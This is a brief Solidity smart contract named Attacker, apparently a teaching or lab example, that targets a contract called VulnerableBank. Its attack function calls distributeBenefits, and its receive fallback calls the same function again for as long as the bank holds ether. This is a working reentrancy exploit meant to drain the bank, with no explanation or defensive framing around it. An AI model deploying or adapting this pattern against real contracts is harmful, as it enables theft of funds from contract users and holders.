contract Attacker {

  VulnerableBank bank; 

  constructor(VulnerableBank _bank) {
    bank = VulnerableBank(_bank);
  }

  function attack() external {
    bank.distributeBenefits(10); 
  }

  receive() external payable {
    if (address(bank).balance > 0) {
      bank.distributeBenefits(10);
    }
  }

}